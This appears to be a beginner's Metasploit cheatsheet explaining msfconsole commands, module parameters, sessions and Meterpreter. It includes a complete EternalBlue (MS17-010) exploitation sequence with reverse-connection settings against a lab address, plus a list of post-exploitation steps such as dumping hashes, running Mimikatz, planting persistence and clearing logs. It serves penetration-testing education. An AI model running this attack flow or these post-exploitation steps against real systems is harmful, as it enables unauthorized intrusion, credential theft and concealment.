# Metasploit Cheatsheet (Beginner Friendly)

----

If you're a beginner in the world of ethical hacking, this is the perfect place to learn the basics of using Metasploit – one of the most powerful tools for penetration testing.

---

## 📚 Table of Contents

- [🔧 Launching Metasploit](#launching-metasploit)
- [❓ What is Metasploit?](#what-is-metasploit)
- [🔎 Navigating Through Modules](#navigating-through-modules)
- [📌 What Are Parameters?](#what-are-parameters)
- [🧠 Explanation of Basic Parameters](#explanation-of-basic-parameters)
- [⚙️ Setting Parameters](#setting-parameters)
- [📜 Types of Prompts in Metasploit](#types-of-prompts-in-metasploit)
- [🧪 Check Vulnerability Without Exploiting](#check-vulnerability-without-exploiting)
- [💣 Exploitation](#exploitation)
- [💻 Session Management](#session-management)
- [🔁 Useful Meterpreter Commands – Quick Reference Table](#useful-meterpreter-commands--quick-reference-table)
- [✅ Example: Full Attack Flow (MS17-010)](#example-full-attack-flow-ms17-010)
- [🧾 Quick Reference Table](#quick-reference-table)
- [🚀 What Can You Do After Exploitation?](#what-can-you-do-after-exploitation)

---

## 🔧 Launching Metasploit

---
 ```
msfconsole
 ```
This command starts the Metasploit console (msfconsole) from the terminal. All other commands will be executed from there.

## ❓ What is Metasploit?

Metasploit is a penetration testing framework used to:

- ○ Scan systems for vulnerabilities

- ○ Exploit security weaknesses

- ○ Gain remote access to target systems

- ○ Perform post-exploitation tasks

- ○ Test payloads and delivery techniques

It supports many modules for different phases of an attack: reconnaissance, exploitation, and post-exploitation.

---

## 🔎 Navigating Through Modules

   1. Search for an exploit:

  ```search <name or vulnerability> ```

Example:

 ```
search ms17_010
 ```

2. Choose an exploit:
   
 ```
use <path/to/module>
 ```
Example:

 ```
use exploit/windows/smb/ms17_010_eternalblue  (ms17_010_eternalblue EXAMPLE)
 ```

3. Check required parameters:

 ```
show options
 ```

⚠️ Each module has its own required and optional parameters. Use show options to see what must be set.

## 📌 What Are Parameters?

Parameters tell Metasploit how to configure the exploit or payload. These include:

- IP addresses (target and local)

- Ports

- Authentication credentials (if needed)

- Payload settings

You must correctly set these before running an attack.

## 🧠 Explanation of Basic Parameters


| Parameter | Description |
|----------|-------------|
| `RHOSTS`  | **Remote Host** – IP address of the target. Can be a single IP (`10.10.xx.xx`), a range (`10.10.x.x/24`), or a file (`file:/path/to/targets.txt`). |
| `RPORT`   | **Remote Port** – Port on the target running the service (e.g., `445` for SMB, `80` for HTTP). |
| `LHOST`   | **Local Host** – Your machine’s IP address (e.g., Kali VM). The target connects back to this IP. |
| `LPORT`   | **Local Port** – Port on your machine to receive the reverse connection (commonly `4444`). |
| `PAYLOAD` | Code executed on the target upon successful exploitation (e.g., reverse shell, Meterpreter). |
| `SESSION` | Active connection established with the exploited system. Used to interact with the target. |


Once a connection is established with the target, you get a session. Each session has an ID used to interact with it.

---
 
### 🔁 Any parameter can be changed using set, removed with `unset`, or globally set using setg and unsetg.

## ⚙️ Setting Parameters

🔹 Set per module:

set PARAMETER VALUE

Examples:
 ```
set RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444
 ```
🔹 Set parameters globally:

setg PARAMETER VALUE

Example:

 ```
setg RHOSTS 10.10.165.39
 ```
Use setg if you want the parameter to apply across all modules without needing to set it each time.

🔹 Clear parameters:
 ```
unset <PARAM>
unsetg <PARAM>
unset all
 ```
---

## 📜 Types of Prompts in Metasploit

| Prompt                   | Meaning |
|--------------------------|---------|
| `root@...`               | Your system’s standard command line – you're outside of Metasploit |
| `msf6 >`                 | Main Metasploit prompt – no module selected yet |
| `msf6 exploit(...) >`    | A specific module is active – now you can use `set`, `exploit`, etc. |
| `meterpreter >`          | You're inside a Meterpreter session – a tool for interacting with the target system |
| `C:\Windows\...>`        | Command shell on the target – standard CMD session opened directly from the exploited machine |

---

##  🧪 Check Vulnerability Without Exploiting

You can use certain auxiliary modules to check if a system is vulnerable without actually exploiting it:
 ```
use auxiliary/scanner/smb/smb_ms17_010
run
 ```
If setg was used, parameters like RHOSTS will already be set:

show options
run

## 💣 Exploitation

Run exploit:
 ```
exploit
```
Or:
```
run
```
To run the exploit and background the session immediately:
```
exploit -z
```
Session will stay in the background (you can access it later with sessions).

💻 Session Management

List sessions:
```
sessions
```
Interact with a session:
```
sessions -i <ID>
```
Exit Meterpreter and return to msfconsole:
```
background
```
Or:

CTRL + Z
 
## 🔁 Useful Meterpreter Commands – Quick Reference Table

| Command                  | Description |
|--------------------------|-------------|
| `sysinfo`                | Displays system information of the target (OS, architecture, hostname, etc.) |
| `getuid`                 | Shows the current user (UID) you're running as on the target |
| `shell`                  | Opens a standard CMD shell on the target system |
| `screenshot`             | Captures a screenshot of the target machine |
| `upload <local_file>`    | Uploads a file from your machine to the target |
| `download <target_file>` | Downloads a file from the target to your machine |

✅ Example: Full Attack Flow (MS17-010)
```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS 10.10.165.39
set LHOST 10.10.44.70
set LPORT 4444
exploit -z
```
After Successful Exploit:
```
sessions
sessions -i 1
```
----

## 🧾 Quick Reference Table

| Command                         | Description |
|--------------------------------|-------------|
| `msfconsole`                   | Launches the Metasploit console |
| `search <term>`                | Searches for modules by name or vulnerability (e.g., `search ms17_010`) |
| `use <path/to/module>`        | Selects a specific exploit module |
| `info`                         | Displays details about the selected module |
| `set <option> <value>`        | Sets a parameter value (e.g., `set RHOSTS 10.10.xx.xx`) |
| `unset <option>`              | Removes a previously set value |
| `show options`                | Displays required and optional module options |
| `exploit`                     | Launches the exploit |
| `run`                         | Alternative to `exploit`, often used with auxiliary modules |
| `back`                        | Returns to the main console menu |
| `exit`                        | Exits the msfconsole |

--- 

## 🚀 What Can You Do After Exploitation?

- Once the target is compromised, you can:

- Dump password hashes

- Enumerate users and groups

- Pivot into internal networks

- Upload and run tools like Mimikatz

- Log keystrokes

- Set up persistence (reconnect after reboot) -backdor

- Escalate privileges to admin/system

- Clean logs and cover tracks


------


> ⚠️ **Disclaimer:** This cheatsheet is intended for educational purposes only.  
> It is meant to support learning and ethical use of cybersecurity tools and techniques.  
> Unauthorized access or misuse of systems is illegal and strictly discouraged.
